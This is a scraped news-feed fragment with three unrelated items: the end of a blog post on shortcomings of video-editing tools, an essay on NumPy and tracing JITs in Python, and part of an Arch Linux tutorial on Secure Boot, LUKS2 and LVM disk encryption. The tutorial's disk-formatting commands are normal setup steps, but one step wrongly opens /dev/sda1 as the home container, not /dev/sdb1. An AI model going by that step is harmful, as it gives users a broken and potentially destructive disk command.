<div><figure><img src="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=352%2C175&amp;ssl=1" alt="" width="352" height="175" srcset="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=1024%2C513&amp;ssl=1 1024w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=300%2C150&amp;ssl=1 300w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=768%2C385&amp;ssl=1 768w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?zoom=2&amp;resize=352%2C175&amp;ssl=1 704w" sizes="(max-width: 352px) 100vw, 352px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=1024%2C513&amp;ssl=1 1024w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=300%2C150&amp;ssl=1 300w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=768%2C385&amp;ssl=1 768w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?zoom=2&amp;resize=352%2C175&amp;ssl=1 704w" data-lazy-src="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=352%2C175&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>My code editor searches my files and tried to “import” the methods when I start typing.</figcaption></figure></div>



<p>As someone who studied film and animation exclusively for multiple years, I’m generally surprised that the overall ways of producing content are largely the same as they have been 10 years ago, but also seemingly for the past 100.</p>



<p>I understand that the areas of complexity have become more niche, such as in VFX or multi-media. I have no direct experience with any complicated 3D rendering and I haven’t tried any visual editing for non-traditional video displays, so its a stretch to say film hasn’t changed at all. I haven’t touched the surface in new video innovation, but all considering, I wish some basic things were much easier.</p>



<p>For one, when it comes to visual layout, I would love something like the Figma “autolayout” functionality. If I have multiple items in a canvas, I’d like them to self-arrange based on some kind of box model. There should be a way to assign the equivalent of styles as “classes”, such as with CSS, and multiple text elements should be able to inherit/share padding/margin definitions. Things like flexbox and relative/absolute positioning would make visual templates significantly much easier and faster for developing fresh video content.</p>



<div><figure><img src="https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=368%2C157&amp;ssl=1" alt="" width="368" height="157" srcset="https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=1024%2C438&amp;ssl=1 1024w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=300%2C128&amp;ssl=1 300w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=768%2C328&amp;ssl=1 768w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=1536%2C656&amp;ssl=1 1536w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=2048%2C875&amp;ssl=1 2048w" sizes="(max-width: 368px) 100vw, 368px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=1024%2C438&amp;ssl=1 1024w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=300%2C128&amp;ssl=1 300w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=768%2C328&amp;ssl=1 768w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=1536%2C656&amp;ssl=1 1536w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=2048%2C875&amp;ssl=1 2048w" data-lazy-src="https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=368%2C157&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Currently I make visual frames in Figma, then export them because its so much easier than fumbling through the 2D translations in Premiere</figcaption></figure></div>



<p>I would love to have a “smarter” timeline that can surface “cues” that I may want to hook into for visual changes. The cues could make use of machine analyzable features in the audio and video, based on features detected in the available content. This is filled with lots of hairy areas, and definitely sounds nicer than it might be in actuality. At a basic example, the timeline could look at audio or a transcript and know when a certain speaker is talking. There are already services, such as Descript, that make seamless use of speaker detection. That should find some expression in video editing software. Even if the software itself doesn’t detect this information, the metadata from other software should be made use of.</p>



<figure><img src="https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=1024%2C786&amp;ssl=1" alt="" srcset="https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=1024%2C786&amp;ssl=1 1024w, https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=300%2C230&amp;ssl=1 300w, https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=768%2C589&amp;ssl=1 768w, https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?w=1256&amp;ssl=1 1256w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=1024%2C786&amp;ssl=1 1024w, https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=300%2C230&amp;ssl=1 300w, https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=768%2C589&amp;ssl=1 768w, https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?w=1256&amp;ssl=1 1256w" data-lazy-src="https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=1024%2C786&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>The two basic views in Zoom. Grid or speaker.</figcaption></figure>



<p>More advanced would be to know when certain exchanges between multiple people are a self-encompassed “point”. Identifying when a “exchange” takes place, or when a “question” is “answered”, would be useful for title slides or lower-thirds with complimentary text.</p>



<div><figure><img src="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=350%2C255&amp;ssl=1" alt="" width="350" height="255" srcset="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=1024%2C746&amp;ssl=1 1024w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=300%2C218&amp;ssl=1 300w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=768%2C559&amp;ssl=1 768w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?w=1450&amp;ssl=1 1450w" sizes="(max-width: 350px) 100vw, 350px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=1024%2C746&amp;ssl=1 1024w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=300%2C218&amp;ssl=1 300w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=768%2C559&amp;ssl=1 768w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?w=1450&amp;ssl=1 1450w" data-lazy-src="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=350%2C255&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Descript will identify speakers and color code the transcript.</figcaption></figure></div>



<p>If there are multiple shots of the same take, it would be nice to have the clips note where the beginning and end based on lining up the audio. Reviewing content shouldn’t be done in a linear fashion if there are ways to distinguish content of video/audio clip and compare it to itself or other clips.</p>



<p>In line with “cues”, I would like to “search” my video in a much more comprehensive way. My iPhone photos app lets me search by faces or location. How about that in my video editor? All the video clips with a certain face or background?</p>



<p>Also, it would be nice to generate these “features” with some ease. I personally dont know what it would take to train a feature detector by viewing some parts of a clip, labeling it, and then using the labeled example to find the other instances of similar kinds of visual content. I do know its possible, and that would be very useful for speeding up the editing process.</p>



<p>In my use case, I’m seeing a lot of video recordings of Zoom calls or webinars. This is another example of video content that generally looks the “same” and could be analyzed for certain content types. I would be able to quickly navigate through clips if I could be able to filter video by when the video is a screen of many faces viewed at once, or when only one speaker is featured at a time. </p>



<p>All of this to say, there is a lot of gaps in the tools available at the moment.</p>

</div></article></main></div></div></div>]]>
            </description>
            <link>https://blog.rememberlenny.com/2020/09/15/why-is-video-editing-so-horrible-today/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512292</guid>
            <pubDate>Fri, 18 Sep 2020 02:20:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data Oriented Programming in Python]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24511966">thread link</a>) | @brilee
<br/>
September 17, 2020 | https://www.moderndescartes.com/essays/data_oriented_python/ | <a href="https://web.archive.org/web/*/https://www.moderndescartes.com/essays/data_oriented_python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
	

<p> Originally posted 2020-09-13</p>
<p> Tagged: <a href="https://www.moderndescartes.com/essays/tags/optimization">optimization</a>, <a href="https://www.moderndescartes.com/essays/tags/computer_science">computer_science</a>, <a href="https://www.moderndescartes.com/essays/tags/python">python</a></p>
<p> <em>Obligatory disclaimer: all opinions are mine and not of my employer </em></p>
<hr>

<p>Many users of Python deprioritize performance in favor of soft benefits like ergonomics, business value, and simplicity. Users who prioritize performance typically end up on faster compiled languages like C++ or Java.</p>
<p>One group of users is left behind, though. The scientific computing community has lots of raw data they need to process, and would very much like performance. Yet, they struggle to move away from Python, because of network effects, and because Python’s beginner-friendliness is appealing to scientists for whom programming is not a first language. So, how can Python users achieve some fraction of the performance that their C++ and Java friends enjoy?</p>
<p>In practice, scientific computing users rely on the NumPy family of libraries e.g.&nbsp;NumPy, SciPy, TensorFlow, PyTorch, CuPy, JAX, etc.. The sheer proliferation of these libraries suggests that the NumPy model is getting something right. In this essay, I’ll talk about what makes NumPy so effective, and where the next generation of Python numerical computing libraries (e.g.&nbsp;TensorFlow, PyTorch, JAX) seems to be headed.</p>
<h2 id="data-good-pointers-bad">Data good, pointers bad</h2>
<p>A pesky fact of computing is that computers can compute far faster than we can deliver data to compute on. In particular, data transfer <em>latency</em> is the Achille’s heel of data devices (both RAM and storage). Manufacturers disguise this weakness by emphasizing improvements in data transfer <em>throughput</em>, but latency continues to stagnate. Ultimately, this means that any chained data access patterns, where one data retrieval must be completed before the next may proceed, are the worst case for computers.</p>
<p>These worst-case chained data access patterns are unfortunately quite common – so common that they have a name you may be familiar with: a pointer.</p>
<p>Pointers have always been slow. In the ’80s and ’90s, our hard drives were essentially optimized record players, with a read head riding on top of a spinning platter. These hard drives had physical limitations: The disk could only spin so fast without shattering, and the read head was also mechanical, limiting its movement speed. Disk seeks were slow, and the programs that were most severely affected were databases. Some ways that databases dealt with these physical limitations are:</p>
<ul>
<li>Instead of using binary trees (requiring <span>\(\log_2 N\)</span> disk seeks), B-trees with a much higher branching factor <span>\(k\)</span> were used, only requiring <span>\(\log_k N\)</span> disk seeks.</li>
<li>Indices were used to query data without having to read the full contents of each row.</li>
<li>Vertically-oriented databases optimized for read-heavy workloads (e.g.&nbsp;summary statistics over one field, across entire datasets), by reorganizing from <a href="https://en.wikipedia.org/wiki/AoS_and_SoA">arrays of structs to structs of arrays</a>. This maximized effective disk throughput, since no extraneous data was loaded.</li>
</ul>
<p>Today, compute speed is roughly <span>\(10^5 - 10^6\)</span> times faster than in 1990. Today, RAM is roughly <span>\(10^5\)</span> times faster than HDDs from 1990. I was amused and unsurprised to find that Raymond Hettinger’s <a href="https://www.youtube.com/watch?v=npw4s1QTmPg">excellent talk on the evolution of Python’s in-memory <code>dict</code> implementation</a> plays out like a brief history of early database design. Time, rather than healing things, has only worsened the compute-memory imbalance.</p>
<h2 id="numpys-optimizations">NumPy’s optimizations</h2>
<h3 id="boxing-costs">Boxing costs</h3>
<p>In many higher-level languages, raw data comes in boxes containing metadata and a pointer to the actual data. In Python, the PyObject box holds reference counts, so that the garbage collector can operate generically on all Python entities.</p>
<p>Boxing creates two sources of inefficiency:</p>
<ul>
<li>The metadata bloats the data, reducing the data density of our expensive memory.</li>
<li>The pointer indirection creates another round trip of memory retrieval latency.</li>
</ul>
<p>A NumPy array can hold many raw data within a single PyObject box, <em>provided that all of those data are of the same type</em> (int32, float32, etc.). By doing this, NumPy amortizes the cost of boxing over multiple data.</p>
<p>In <a href="https://www.moderndescartes.com/essays/deep_dive_mcts">my previous investigations into Monte Carlo tree search</a>, a naive UCT implementation performed poorly because it instantiated millions of UCTNode objects whose sole purpose was to hold a handful of float32 values. In the optimized UCT implementation, these nodes were replaced with NumPy arrays, reducing memory usage by a factor of 30.</p>
<h3 id="attribute-lookup-function-dispatch-costs">Attribute lookup / function dispatch costs</h3>
<p>Python’s language design forces an unusually large amount of pointer chasing. I mentioned boxing as one layer of pointer indirection, but really it’s just the tip of the iceberg.</p>
<p>Python has no problem handling the following code, even though each of these multiplications invokes a completely different implementation.</p>
<pre><code>&gt;&gt;&gt; mixed_list = [1, 1.0, 'foo', ('bar',)]
&gt;&gt;&gt; for obj in mixed_list:
...     print(obj * 2)

2
2.0
'foofoo'
('bar', 'bar')</code></pre>
<p>Python accomplishes this with a minimum of two layers of pointer indirection:</p>
<ol type="1">
<li>Look up the type of the object.</li>
<li>Look up and execute the <code>__mul__</code> function from that type’s operation registry.</li>
</ol>
<p>Additional layers of pointer indirection may be required if the <code>__mul__</code> method is defined on a superclass: the chain of superclasses must be traversed, one pointer at a time, until an implementation is found.</p>
<p>Attribute lookup is similarly fraught; <code>@property</code>, <code>__getattr__</code>, and <code>__getattribute__</code> provide users with flexibility that incurs pointer chasing overhead with something as simple as executing <code>a.b</code>. Access patterns like <code>a.b.c.d</code> create exactly the chained data access patterns that are a worst-case for data retrieval latency.</p>
<p>To top it all off, merely <em>resolving</em> the object is expensive: there’s a stack of lexical scopes (local, nonlocal, then global) that are checked in order to find the variable name. Each check requires a dictionary lookup, another source of pointer indirection.</p>
<p>As the saying goes: “We can solve any problem by introducing an extra level of indirection… except for the problem of too many levels of indirection”. The NumPy family of libraries deals with this indirection, not by removing it, but again by sharing its cost over multiple data.</p>
<pre><code>&gt;&gt;&gt; homogenous_array = np.arange(5, dtype=np.float32)
&gt;&gt;&gt; multiply_by_two = homogenous_array * 2
&gt;&gt;&gt; print(multiply_by_two)
array([ 0.,  2.,  4.,  6.,  8.], dtype=float32)</code></pre>
<p>Sharing a single box for multiple data allows NumPy to retain the expressiveness of Python while minimizing the cost of the dynamism. As before, this works because of the additional constraint that all data in a NumPy array must have identical type.</p>
<h2 id="the-frontier-jit">The Frontier: JIT</h2>
<p>So far, we’ve seen that NumPy doesn’t solve any of Python’s fundamental problems when it comes to pointer overhead. Instead, it merely puts a bandaid on the problem by sharing those costs across multiple data. It’s a pretty successful strategy – in my hands (<a href="https://www.moderndescartes.com/essays/vectorized_pagerank">1</a>, <a href="https://www.moderndescartes.com/essays/deep_dive_mcts">2</a>), I find that NumPy can typically achieve 30-60x speedups over pure Python solutions to dense numerical code. However, given that C code typically achieves <a href="https://www.moderndescartes.com/essays/data_oriented_python/(https://benchmarksgame-team.pages.debian.net/benchmarksgame/fastest/python3-gcc.html)">100-200x performance</a> over pure Python on dense numerical code (common in scientific computing), it would be nice if we could further reduce the Python overhead.</p>
<p>Tracing <a href="https://en.wikipedia.org/wiki/Just-in-time_compilation">JITs</a> promise to do exactly this. Roughly, the strategy is to trace the execution of the code and record the pointer chasing outcomes. Then, when you call the same code snippet, reuse the recorded outcomes! NumPy amortizes Python overhead over multiple data, and JIT amortizes Python overhead over multiple function calls.</p>
<p>(I should note that I’m most familiar with the tracing JITs used by TensorFlow and JAX. <a href="https://doc.pypy.org/en/latest/">PyPy</a> and <a href="https://numba.pydata.org/">Numba</a> are two alternate JIT implementations that have a longer history, but I don’t know enough about them to treat them fairly, so my apologies to readers.)</p>
<p>Tracing unlocks many wins typically reserved for compiled languages. For example, once you have the entire trace in one place, operations can be fused together (e.g., to make use of the <a href="https://en.wikipedia.org/wiki/FMA_instruction_set">fused multiply-add instructions</a> common to most modern computers), memory layouts can be optimized, and so on. TensorFlow’s <a href="https://www.tensorflow.org/guide/graph_optimization">Grappler</a> is one such implementation of this idea. Traces can also be <a href="https://en.wikipedia.org/wiki/Backpropagation">walked backwards</a> to automatically compute derivatives. Traces can be compiled for different hardware configurations, so that the same Python code executes on CPU, GPU, and TPU. JAX can <a href="https://jax.readthedocs.io/en/latest/notebooks/quickstart.html#Auto-vectorization-with-vmap">autovectorize traces</a>, adding a batch dimension to all operations. Finally, a trace can be exported in a language-agnostic manner, allowing a program defined in Python to be executed in <a href="https://www.tensorflow.org/js">Javascript</a>, <a href="https://www.tensorflow.org/tfx/guide/serving">C++</a>, or more.</p>
<p>Unsurprisingly, there’s a catch to all this. NumPy can amortize Python overhead over multiple data, but only if that data is the same type. JIT can amortize Python overhead over multiple function calls, but only if the function calls would have resulted in the same pointer chasing outcomes. Retracing the function to verify this would defeat the purpose of JIT, so instead, TensorFlow/JAX JIT uses array shape and dtype to guess at whether a trace is reusable. This heuristic is necessarily conservative, rules out otherwise legal programs, often requires unnecessarily specific shape information, and doesn’t make any guarantees against mischievous tinkering. Furthermore, data-dependent tracing is a known issue (<a href="https://pytorch.org/docs/stable/generated/torch.jit.trace.html">1</a>, <a href="https://jax.readthedocs.io/en/latest/notebooks/Common_Gotchas_in_JAX.html#python-control-flow-+-JIT">2</a>). I worked on <a href="https://blog.tensorflow.org/2018/07/autograph-converts-python-into-tensorflow-graphs.html">AutoGraph</a>, a tool to address data-dependent tracing. Still, the engineering benefits of a shared tracing infrastructure are too good to pass up. I expect to see JIT-based systems flourish in the future and iron out their user experience.</p>
<h2 id="conclusion">Conclusion</h2>
<p>The NumPy API’s specifically addresses Python’s performance problems for the kinds of programs that scientific computing users want to write. It encourages users to write code in ways that minimize pointer overhead. Coincidentally, this way of writing code is a fruitful abstraction for tracing JITs targeting vastly parallel computing architectures like GPU and TPU. (Some people argue that <a href="https://dl.acm.org/citation.cfm?id=3321441">machine learning is stuck in a rut</a> due to this NumPy monoculture.) In any case, tracing JITs built on top of …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.moderndescartes.com/essays/data_oriented_python/">https://www.moderndescartes.com/essays/data_oriented_python/</a></em></p>]]>
            </description>
            <link>https://www.moderndescartes.com/essays/data_oriented_python/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511966</guid>
            <pubDate>Fri, 18 Sep 2020 01:22:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Secure your boot process: UEFI and Secureboot and EFISTUB and Luks2 and lvm]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24511852">thread link</a>) | @zdw
<br/>
September 17, 2020 | https://nwildner.com/posts/2020-07-04-secure-your-boot-process/ | <a href="https://web.archive.org/web/*/https://nwildner.com/posts/2020-07-04-secure-your-boot-process/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>This tutorial isn’t a basic setup how-to in a way you will learn how to install Arch Linux, neither is intended to replace the <a href="https://wiki.archlinux.org/index.php/Installation_guide">Installation Guide</a>, This is a guide for those who want a laptop with data-at-rest encryption and a verified boot process using SecureBoot.</p>
<p>I’ll not be arrogant saying that this setup is “tampering-proof” since this also depends on your firmware manufacturer, but I believe that this is a notebook setup with good enough security.</p>

<ul>
<li>Arch Linux setup overview.</li>
<li>Basic secureboot explanation.</li>
<li>Luks2+lvm setup for encrypted partitions at boot time.</li>
<li><code>/home</code> disk setup with crypttab.</li>
<li>EFISTUB to make Linux “it’s own bootloader” avoiding the entire <code>/boot</code> to be mounted on your ESP.</li>
</ul>

<p>UEFI is the new standard for boot and firmware management and it isn’t perfect, but is a natural answer to the old BIOS standard that has it’s limitations and is not aging well considering those limits and all workarounds involved to break them. You can find more information <a href="https://uefi.org/faq">here</a>. BIOS standard first appeared in IBM computers in 1976 and should (hopefully) die soon.</p>
<p>To keep words/concepts best alligned with what is correct, i’ll not call your basic computer program BIOS but firmware from now on during this reading.</p>
<p>I bought a laptop and wanted to encrypt all my data and thought: “Hey, i can do a full disk encryption but what if someone tamper my <a href="https://en.wikipedia.org/wiki/Master_boot_record">MBR/Boot Sector</a>? So, using secureboot whas the best alternative (even with efi having a plain <code>FAT32</code> partition on it’s standard).</p>
<p>There’s a lot of drama around secureboot, most of it related to Microsoft and the way they demand deploying their keys on OEM vendor equipments. That doesn’t mean that secureboot is bad.</p>
<p>Pretty simple “explain like i’m five” secureboot concept: A Root of Trust combination with keys and certificates. Using SecureBoot your firmware will check if the operating system you are trying to boot and your bootloader are trusted by you. On each boot-up UEFI firmware will inspect what you are trying to boot and if it’s not trusted a security violation will be triggered.</p>
<p>There are four main EFI “variables” used to create a basic secureboot Root of Trust environment:</p>
<ul>
<li>PK: The Platform Key, the master one, the <a href="https://en.wikipedia.org/wiki/One_Ring">ring to rule them all</a>. The holder of a PK can install a new PK and update the KEK.</li>
<li>KEK: Key Exchange Key is a secondary key used to sign EFI executables directly or a key used to signd the db and dbx databases.</li>
<li>db: The signature databse is a list with all allowed signing certificates or criptografy hashes to allowed binaries. We will use THIS db key to sign our Linux Kernel.</li>
<li>dbx: The dark side of the db. Inverse db. “not-good-db”. You name it. It’s the list containing all keys that are not allowed.</li>
</ul>
<p>I would like to highlight the following points of this setup:</p>
<ul>
<li>Your signing keys are stored inside an encrypted disk.</li>
<li>Kernel signing will only happend after you have booted and running an already signed kernel.</li>
<li>Most notebooks today don’t have an exposed CMOS to keep configurations but instead they have nvram modules that will store firmware and configurations.
<ul>
<li>So, put a passord on your firmware to avoid secureboot being disabled.</li>
<li>Putting a password on your firmware will almost invalidate any chance of boot option change or secureboot disable.</li>
<li>In my case there is no “reset bios password” option and losing it will require contacting Lenovo to replace the main board.</li>
</ul>
</li>
<li>Even with secureboot disabled, and attacker will not be able to decrypt your root partition without knowing your password</li>
<li>If you are worried about keys being accessed after booting, you have other issues to solve and disk encryption + secureboot will not be the answer.</li>
<li>Modern processors have <code>aes-ni</code> instuction that will help on disk decryption avoiding high cpu usage for this task.</li>
<li>Using a key to unlock luks <code>/home</code> partition is a way to increase convenience without sacrificing security. That key is stored inside another encrypted partition so, there is no much to worry about.</li>
<li>lvm inside a luks container gives you a lot of flexibility. This will also remove any visibility if someone steal you equipment since lvs will be inside one container.
<ul>
<li>Less error prone setup while manipulating <code>UUID</code>s is also an implicit feature.</li>
</ul>
</li>
</ul>
<p>With that in mind, lets install ArchLinux, first boot it and create the Root of Trust of your notebook.</p>

<p>There’s a plenty of “efi how-tos” for Arch Linux on the internet, and some of the instructions here will be just an overview of what you dear reader will have to execute</p>
<p><strong>Step 01</strong>: Download Arch Linux <a href="https://www.archlinux.org/download/">here</a> and write it to a pendrive using <code>dd bs=4M if=path/to/archlinux.iso of=/dev/sdx status=progress oflag=sync</code> where<code>sdx</code> is your pendrive. If you are using Windows to create your bootable pendrive <a href="https://sourceforge.net/projects/win32diskimager/">Win32 Disk Imager</a> will help you.</p>
<p><strong>Step 02</strong>: Configure your firmware to boot using UEFI, but keep secure boot disabled. Allow boot from usb and change it to be your first boot device. These instructions are pretty much vendor dependent and can change depending on your equipment.</p>
<p><strong>Step 03</strong>: Boot Arch Linux live usb, and after getting a shell change your keybord layout with the following command: <code>loadkeys br-abnt2</code></p>
<p>After that, connect to your wifi using <code>wifi-menu -o your_device</code>. There is an issue with the latest Arch Linux iso(06/2020) and <code>wifi-menu</code> is not working as expected. If you are using ethernet just ignore this step. Enable ntp sync with <code>timedatectl set-ntp true</code>.</p>
<p><strong>Step 04</strong>: Create <code>luks2</code> containers and <code>lvm2</code> volumes on the first disk. On my laptop i have 2 drives: <code>sda</code> is a ssd while <code>sdb</code> is a spinning disk. Use <code>cgdisk /dev/sda</code> and create a 256MB(i’m using 512MB but noticed that is way too much) partition for EFI (<a href="https://wiki.archlinux.org/index.php/EFI_system_partition">ESP</a>) code <code>ef00</code> and the rest of your disk space create a partition with code <code>8309</code>(Linux Luks).</p>
<p>Create your luks container and open it. Default block cipher and block encyption mode should be good enough so there is no need of changing it with <code>-c</code> parameter:</p>
<pre><code>cryptsetup -y -v --use-random luksFormat /dev/sda2
cryptsetup luksOpen /dev/sda2 crypt
</code></pre>
<p>Create your lvm infraesturucture on top of it. I’ll create swap and root logical volumes</p>
<pre><code>pvcreate /dev/mapper/crypt
vgcreate vg0 /dev/mapper/crypt
lvcreate --size 4G vg0 --name swap
lvcreate --size 30G vg0 --name root
</code></pre>
<p>Format your ESP, root and swap partitions/volumes</p>
<pre><code>mkfs.vfat -F32 /dev/sda1
mkfs.ext4 /dev/mapper/vg0-root
mkswap /dev/mapper/vg0-swap
</code></pre>
<p><strong>Step 05</strong> Now create a <code>luks2</code> container without lvm on it cause we will use the full disk just for <code>/home</code> and automatically map/mount it using <code>crypttab+fstab</code> here. Instead of typing a password 2 times during boot(one for root, another for home), we will just type the password for the root partition and host a key inside this encrypted partition to open the home luks container. Using a key to open a luks device has the same risks as typing a password and storing it into your ram. <code>cgdisk /dev/sdb</code> and create an all-disk partition using <code>8309</code> partition code.</p>
<pre><code>cryptsetup -y -v --use-random luksFormat /dev/sdb1
cryptsetup luksOpen /dev/sda1 crypthome
mkfs.ext4 /dev/mapper/crypthome
</code></pre>
<p><strong>Step 06</strong> Mount all and start to install:</p>
<pre><code>mount /dev/mapper/vg0-root /mnt
mkdir /mnt/efi
mkdir /mnt/home
mount /dev/sda1 /mnt/efi
mount /dev/mapper/crypthome /mnt/home
pacstrap /mnt base base-devel vim efibootmgr linux linux-firmware lvm2 mkinitcpio networkmanager intel-ucode git
</code></pre>
<p>Do not install <code>intel-ucode</code> if you are using an AMD processor.</p>
<p><strong>Step 07</strong>: Create your <code>fstab</code> and change root to your new system</p>
<pre><code>genfstab -U /mnt &gt;&gt; /mnt/etc/fstab
arch-chroot /mnt
</code></pre>
<p><strong>Step 08</strong>: Change your fstab <code>/home</code> mount point to use the device mapper name. If you try to mount it using <code>UUID</code> it will fail cause it needs to be decrypted first.</p>
<pre><code># /home
/dev/mapper/crypthome	/home     	ext4      	rw,relatime	0 2
</code></pre>
<p>Create a key to automatically open the home luks container. Change the “secretfolder” path example as you please.</p>
<pre><code>mkdir /root/secretfolder
chmod 700 /root/secretfolder
dd bs=512 count=4 if=/dev/urandom of=/root/secretfolder/crypto_keyfile.bin
</code></pre>
<p>Find the UUID of your home luks container(<code>sdb1</code> not <code>crypthome</code>) and add it to your <code>/etc/crypttab</code>. Crypttab columns are: mapping name(crypthome), luks partition UUID, key path and luks. You can check disks UUID by issuing <code>blkid /dev/yyy</code> where <code>yyy</code> could be a partition or a disk. In this case, use <code>sdb1</code>.</p>
<pre><code>crypthome UUID=29d3555d-cccc-yyyy-xxxx-xxxxxxxxxxxx /root/secretfolder/crypto_keyfile.bin luks
</code></pre>
